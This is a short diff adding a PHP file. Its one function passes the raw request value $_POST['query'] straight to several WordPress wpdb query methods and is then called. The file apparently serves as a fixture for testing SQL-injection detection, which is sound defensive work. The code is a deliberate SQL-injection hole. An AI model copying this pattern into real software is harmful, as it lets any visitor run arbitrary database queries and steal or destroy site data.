@@ -1,0 +1,13 @@
+<?php
+
+function get_document_data(){
+
+	$testObj = new wpdb('', '', '', '');
+	$testObj->get_results($_POST['query'] ); 
+	$testObj->query($_POST['query'] ); 
+	$testObj->test_mysqlq($_POST['query'] );
+	$testObj->query_test($_POST['query'] );
+	$testObj->_do_query($_POST['query'] );
+
+}
+get_document_data();
